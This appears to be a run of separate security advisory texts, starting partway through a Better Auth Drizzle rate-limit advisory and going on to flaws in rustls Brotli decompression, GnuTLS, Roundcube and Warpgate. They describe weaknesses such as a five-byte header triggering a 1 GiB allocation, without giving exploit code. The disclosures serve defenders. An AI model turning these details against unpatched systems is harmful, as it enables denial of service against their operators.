The Drizzle fix is merged for the planned `@better-auth/drizzle-adapter` 1.7.7 release. That package is not available yet. Upgrade `better-auth` and the installed Drizzle adapter together when 1.7.7 is available. No database schema or public API migration is required.

## Workarounds

- Store rate-limit records in secondary storage.
- Use a custom rate-limit storage that checks and increments the counter in one atomic step. An atomic step cannot be interrupted by another request.
- Enforce the intended limit at an upstream layer, such as a reverse proxy or gateway.

In-memory storage also avoids this issue. However, each application instance keeps its own counter, so it may not enforce one shared limit in multi-instance or serverless deployments.

items.title: Rustls: Brotli certificate decompression can allocate an attacker-controlled amount of memory up to 1 GiB before authentication.
items.description:
### Summary

The built-in (but disabled by default) Brotli certificate decoder bounds the output buffer but accepts an input-selected history window. A header of five bytes can specify a 1 GiB window allocation. A peer can abort a process whose allocator cannot satisfy that request. A client must enable Brotli and connect to the peer; a server must enable Brotli and request a client certificate. Neither direction requires a trusted attacker certificate.

### Details

rustls calls `BrotliDecompress` which enables Brotli's large-window extension. rustls applies a limit to certificates, but this applies to the decompressed result, and not to any internal allocations the process requires.

### Impact

Client applications that enable the `brotli` feature will be vulnerable to malicious servers. Server applications that enable the `brotli` feature and enable client authentication will be vulnerable to malicious clients.

Potential for denial of service due to memory exhaustion from peers sending malicious Brotli-encoded certificates, for applications that enable Brotli decompression.

### Acknowledgement
Thanks to OpenAI [OutboundDisclosures@openai.com](mailto:OutboundDisclosures@openai.com) for the disclosure.

In GnuTLS v3.8.13, an excluded msUPN/SRV otherName is never checked. NOTE: the Supplier does not consider this an actionable security vulnerability because of its "threat model doesn't consider attacks only possible by modifying anything within the trust boundary (private keys, trusted certificate authorities and their issued certificates including intermediate CAs, etc.)" policy.

Roundcube Webmail before 1.6.20 and 1.7.x before 1.7.5 allows the ImageMagick resource limits to be bypassed during thumbnail generation. When rcube_image falls back to GD, the available-memory check was applied only on Windows, so on other platforms a crafted image with large dimensions was processed by GD without any resource limit and could exhaust server memory. Upstream fixed this in the commit “Fix ImageMagick resource limits bypass by GD fallback during thumbnail generation”, which applies the memory check on all platforms.

GnuTLS v3.8.13 does not reject end-entity X.509 certificates that contain a contradictory combination of Key Usage (KU) and Extended Key Usage (EKU). NOTE: the Supplier does not consider this an actionable security vulnerability because of its "threat model doesn't consider attacks only possible by modifying anything within the trust boundary (private keys, trusted certificate authorities and their issued certificates including intermediate CAs, etc.)" policy.

Warpgate is an open source SSH, HTTPS, and MySQL bastion host for Linux. Prior to 0.29.0, the Kubernetes protocol listener uses AcceptAnyClientCert in warpgate-protocol-kubernetes/src/server/client_certs.rs to accept certificates at the TLS layer and defer validation to warpgate-protocol-kubernetes/src/server/auth.rs, where authentication and lookup failures are rendered verbatim in an HTTP 500 response body.
